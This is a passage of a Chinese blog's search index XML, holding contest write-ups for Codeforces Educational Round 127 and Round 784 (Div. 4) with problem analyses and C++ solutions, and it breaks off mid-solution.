<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>educational codeforces round 127(Div.2)</title>
      <link href="/2022/04/23/educational%20codeforces%20round%20127(div.2)/"/>
      <url>/2022/04/23/educational%20codeforces%20round%20127(div.2)/</url>
      
        <content type="html"><![CDATA[<p><a href="https://codeforces.com/contest/1671">Educational Codeforces Round 127 (Rated for Div. 2)</a>，咕了有点久了，现在开写题解。</p><span id="more"></span><h2 id="A-String-Building"><a href="#A-String-Building" class="headerlink" title="A. String Building"></a>A. String Building</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/23/educational%20codeforces%20round%20127(div.2)/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>分析字符串是否能由aa,aaa,bb,bbb组成，给定字符串只含有a和b，很简单，就看看有没有单独存在的a或者b即可</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">100005</span>]; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(len==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    s[len++]=<span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==s[i<span class="number">-1</span>])&#123;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(ans==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">            ans=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Consecutive-Points-Segment"><a href="#B-Consecutive-Points-Segment" class="headerlink" title="B. Consecutive Points Segment"></a>B. Consecutive Points Segment</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/23/educational%20codeforces%20round%20127(div.2)/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>在数轴上放若干个点，每个点可以左移或者右移一个单位，或者不移，判断最后所有点能否在整数集合内连续。只考虑最左边和最右边的点，不难发现，若能连续，则满足a[n]-a[1]=n-1，我们就看最外两个点能否达到这个约束。若左边点右移，右边点左移则可以使得间距缩小2，因此若原本距离超过了n+1则一定不行。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">200005</span>]; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;%d %d\n&quot;,a[n]-a[1],n);</span></span><br><span class="line">    <span class="keyword">if</span>(a[n]-a[<span class="number">1</span>]&gt;n+<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Dolce-Vita"><a href="#C-Dolce-Vita" class="headerlink" title="C. Dolce Vita"></a>C. Dolce Vita</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/23/educational%20codeforces%20round%20127(div.2)/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>这题很有意思。给你n个商店和每天 $k$ 枚金币，每个商店只每天卖一个糖果包，每天涨价一块。问经过很多天后你最多能买到多少，并且它告诉你了最后一定有一天你一个糖果包也买不了。</p><p>首先不难得出，我肯定要从最小的糖果开始买买到不能买为止才是最优的解。因此先排个序肯定没错，然后求出前缀和 $sum[i]$表示买 $i$ 个糖果的最小花费。这里因为天数不确定很可能要过超过 $10^9$ 天，因此我们不能从天数上循环，我们就推从能买 $i$ 个物品到 $i-1$ 个物品过了多少天，假设过了 $q$ 天，那么这几天的收益就是 $q*i$。</p><p>那么假设今天是x天，我能买j件物品，我们能持续买j件物品的天数就是 $ceil((double)(x-sum[j])/j-i)+!((x-sum[j])%j)$。推出表达式之后其实整个程序也就不难写了，先二分出第0天的位置然后往前一件一件数即可，最后不要忘了开 $long\ long$，可恶，没准我开了就蓝名了。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">200005</span>];</span><br><span class="line"><span class="keyword">int</span> sum[<span class="number">200005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,x;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;x;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(a+<span class="number">1</span>,a+<span class="number">1</span>+n);</span><br><span class="line">    sum[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        sum[i]=sum[i<span class="number">-1</span>]+a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="built_in">upper_bound</span>(sum,sum+<span class="number">1</span>+n,x)-sum<span class="number">-1</span>;</span><br><span class="line">    <span class="comment">//printf(&quot;I can choose %d pack\n&quot;,cnt);</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=cnt;j&gt;=<span class="number">1</span>;j--)&#123;</span><br><span class="line">        <span class="comment">//printf(&quot;today is %d-th day\n&quot;,i);</span></span><br><span class="line">        <span class="keyword">int</span> after= <span class="built_in">ceil</span>((<span class="keyword">double</span>)(x-sum[j])/j-i)+!((x-sum[j])%j);</span><br><span class="line">        i+=after;</span><br><span class="line">        <span class="comment">//printf(&quot;I can buy until %d\n&quot;,i);</span></span><br><span class="line">        ans+=j*after;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-Insert-a-Progression"><a href="#D-Insert-a-Progression" class="headerlink" title="D. Insert a Progression"></a>D. Insert a Progression</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/23/educational%20codeforces%20round%20127(div.2)/4.png" alt="4"></p><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>在数列中插入x个数，使得 $\sum <em>{i=1}^{n+x-1}|a_i^{‘}-a</em>{i-1}^{‘}|$ 最小。不难发现如果我插入的数在两个数之间，那么插入这个数对结果没有影响。若数列的最小值和最大值包括的部分那些数插入中间对答案没有影响，若剩余其它数则插在两边，至于插在哪边可以min一下。</p><p>这里当时看错题目了，以为每个数之间只能插入一次吗，导致后面卡了很长时间。</p><h3 id="标程-3"><a href="#标程-3" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">200005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,x;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;x;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> max_x=a[<span class="number">1</span>],min_x=a[<span class="number">1</span>],ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        ans+=<span class="built_in">abs</span>(a[i]-a[i<span class="number">-1</span>]);</span><br><span class="line">        max_x=<span class="built_in">max</span>(max_x,a[i]);</span><br><span class="line">        min_x=<span class="built_in">min</span>(min_x,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    ans+=<span class="built_in">min</span>((min_x<span class="number">-1</span>)*<span class="number">2</span>,<span class="built_in">min</span>(<span class="built_in">abs</span>(a[<span class="number">1</span>]<span class="number">-1</span>),<span class="built_in">abs</span>(a[n]<span class="number">-1</span>)));</span><br><span class="line">    <span class="keyword">if</span>(x&gt;max_x)&#123;</span><br><span class="line">        ans+=<span class="built_in">min</span>((x-max_x)*<span class="number">2</span>,<span class="built_in">min</span>(<span class="built_in">abs</span>(x-a[<span class="number">1</span>]),<span class="built_in">abs</span>(x-a[n])));</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果：</p><p><img src="/2022/04/23/educational%20codeforces%20round%20127(div.2)/5.png" alt="5"></p><p>1595分，加油上蓝！！！</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> codeforces </category>
          
          <category> 思维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>codeforces round 784(div.4)解析</title>
      <link href="/2022/04/22/codeforces%20round%20784(div.4)/"/>
      <url>/2022/04/22/codeforces%20round%20784(div.4)/</url>
      
        <content type="html"><![CDATA[<p>今天来打个<a href="https://codeforces.com/contest/1669">div4</a>。</p><span id="more"></span><h2 id="A-Division"><a href="#A-Division" class="headerlink" title="A. Division?"></a>A. Division?</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/22/codeforces%20round%20784(div.4)/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>这应该是描述了 <code>cf</code> 四个层次比赛的最高积分要求，超过将 <code>unrated</code> 进行比赛。直接按他的要求把四个等级判断输出一下就好了。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">50</span>][<span class="number">50</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">1399</span>)&#123;</span><br><span class="line">        k=<span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(n&lt;=<span class="number">1599</span>)&#123;</span><br><span class="line">        k=<span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(n&lt;=<span class="number">1899</span>)&#123;</span><br><span class="line">        k=<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        k=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Division %d\n&quot;</span>,k);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Triple"><a href="#B-Triple" class="headerlink" title="B. Triple"></a>B. Triple</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/22/codeforces%20round%20784(div.4)/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>随便输出一个出现过三次的数就好了，但是要注意出现之后不要马上结束，把剩下的输入读完。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;ma;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;().<span class="built_in">swap</span>(ma);</span><br><span class="line">    <span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x;</span><br><span class="line">        cin&gt;&gt;x;</span><br><span class="line">        <span class="keyword">if</span>(!flag)&#123;</span><br><span class="line">            ma[x]++;</span><br><span class="line">            <span class="keyword">if</span>(ma[x]==<span class="number">3</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,x);</span><br><span class="line">                flag=<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!flag)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Odd-Even-Increments"><a href="#C-Odd-Even-Increments" class="headerlink" title="C. Odd/Even Increments"></a>C. Odd/Even Increments</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/04/22/codeforces%20round%20784(div.4)/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>偶数位置或者奇数位置同时+1，问能否达到全奇数或者全偶数的状态，直接判断奇数位置上是否全为奇数或者全为偶数和偶数位置上是否全为奇数或者全为偶数即可。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;ma;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">200005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">3</span>;i&lt;=n;i+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]%<span class="number">2</span>!=a[i<span class="number">-2</span>]%<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">4</span>;i&lt;=n;i+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]%<span class="number">2</span>!=a[i<span class="number">-2</span>]%<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    